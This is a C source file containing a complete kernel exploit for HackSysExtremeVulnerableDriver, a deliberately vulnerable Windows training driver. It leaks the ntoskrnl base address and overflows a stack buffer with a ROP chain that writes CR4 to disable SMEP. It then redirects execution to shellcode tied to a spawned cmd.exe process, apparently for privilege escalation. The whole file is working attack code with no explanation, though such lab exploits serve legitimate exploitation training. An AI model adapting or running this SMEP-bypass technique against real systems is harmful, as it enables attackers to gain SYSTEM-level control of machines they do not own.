#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0L;
	long long pop_rcx_gadget = 0L, rcx_cr4_value = 0x70678L, mov_cr4_rcx_gadget = 0L, kernel_base = 0L;
	char output[1024], input[2104];

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("[!] HackSysExtremeVulnerableDriver Stack Overflow SMEP Bypass Exploit\n[!] Let's exploit!");

	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a driver handle. Handle Value: 0x%p, Error: %d (0x%x)", h_hevd, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle. Handle Value: 0x%p", h_hevd);

	kernel_base = leak_ntoskrnl_base_address();

	initialize_shellcode();

	pop_rcx_gadget = kernel_base + HVLENDSYSTEMINTERRUPT_POP_RCX_OFFSET;
	mov_cr4_rcx_gadget = kernel_base + KIENABLEXSAVE_MOV_CR4_RCX_OFFSET;
	printf("\n[*] pop rcx + ret gadget address: 0x%p\n[*] mov cr4, rcx + ret gadget address: 0x%p", (long long*)pop_rcx_gadget, (long long*)mov_cr4_rcx_gadget);

	memset(&input, 'A', 2072);

	*(unsigned long long*)(input + 2072) = (long long*)pop_rcx_gadget; // pop rcx
	*(unsigned long long*)(input + 2080) = (long long*)rcx_cr4_value; // 0x70678L ; Pop this value into the rcx register
	*(unsigned long long*)(input + 2088) = (long long*)mov_cr4_rcx_gadget; // mov cr4, rcx ; Copy the contents of the rcx register into the cr4 register, disabling supervisor mode execution prevention (SMEP)

	*(unsigned long long*)(input + 2096) = &shellcode;
	printf("\n[+] Crafted input buffer.\n[!] Overwriting the instruction pointer in five seconds...");

	Sleep(5000);
	DeviceIoControl(h_hevd, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}

void initialize_shellcode()
{
	unsigned long pid = 0L, old_protection = 0L;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;

	RtlSecureZeroMemory(&startup_info, sizeof(startup_info));
	RtlSecureZeroMemory(&process_information, sizeof(process_information));

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &startup_info, &process_information))
	{
		printf("\n[-] Failed to spawn a shell. Error: %d (0x%x)", GetLastError(), GetLastError());
		CloseHandle(process_information.hProcess);
		CloseHandle(process_information.hThread);
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Spawned a shell.");

	pid = process_information.dwProcessId;
	//*(unsigned long*)(shellcode + 27) = pid;
	printf("\n[+] Set shellcode target process ID to %d (0x%x).", pid, pid);

	if (!VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to change shellcode memory protection. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Changed shellcode memory protection.");
}

long long leak_ntoskrnl_base_address()
{
	HMODULE h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	PSYSTEM_MODULE_INFORMATION p_module_info;
	unsigned long return_length = 0L;
	NTSTATUS status = 0;
	long long leaked_address = 0L;

	RtlSecureZeroMemory(&p_module_info, sizeof(p_module_info));

	if (!h_ntdll)
	{
		printf("\n[-] Failed to load ntdll.dll. Handle Value: 0x%p, Error: %d (0x%x)", h_ntdll, GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Loaded ntdll.dll. Handle Value: 0x%p", h_ntdll);

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate NtQuerySystemInformation function address. Address: 0x%p, Error: %d (0x%x)", _NtQuerySystemInformation, GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Located NtQuerySystemInformation function address. Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	p_module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	status = _NtQuerySystemInformation(SystemModuleInformation, p_module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system information. NTSTATUS: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		exit(1);
	}
	printf("\n[+] Queried system information.");

	if (p_module_info)
	{
		leaked_address = p_module_info->Modules[0].ImageBaseAddress;
		printf("\n[+] Successfully leaked ntoskrnl.exe base address. Address: 0x%p", (long long*)leaked_address);
		return leaked_address;
	}

	printf("\n[-] Module information was null or failed to locate ntoskrnl.exe in module information. Failed to leak ntoskrnl.exe base address.");
	unused = getchar();
	exit(1);

	return 0L;
}